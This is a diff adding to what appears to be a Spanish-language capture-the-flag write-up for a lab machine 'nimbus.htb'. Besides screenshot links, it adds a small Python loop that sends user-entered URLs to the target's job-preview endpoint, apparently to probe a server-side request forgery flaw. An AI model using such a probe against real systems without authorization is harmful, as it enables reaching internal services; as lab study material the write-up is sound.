@@ -142,5 +142,36 @@ Connection: keep-alive
 
 <img width="685" height="200" alt="imagen" src="https://github.com/user-attachments/assets/91626051-00de-4ca9-9230-ba39edf7f962" />
 
+<img width="680" height="239" alt="imagen" src="https://github.com/user-attachments/assets/8acf8dfe-1809-4b87-938b-2769ee1f7eb0" />
+
+<img width="674" height="90" alt="imagen" src="https://github.com/user-attachments/assets/b7994679-563c-456b-8cfc-7f15fff96ddf" />
+
+
+``` python
+
+import requests
+
+while True:
+
+      url = "http://nimbus.htb"
+      submit_job = "/jobs/preview"
+      full_url = url + submit_job
+
+      user_input=input("url: ")
+      data = {
+        "url": user_input
+        }
+
+      if user_input == "exit":
+          break
+      try:
+          response = requests.post(full_url, data=data, timeout=10)
+          response.raise_for_status()
+          print("Response: \n", response.text)
+      except requests.exceptions.HTTPError as errh:
+             print(f"Error HTTP del servidor: {errh}")
+
+```
+
 
 
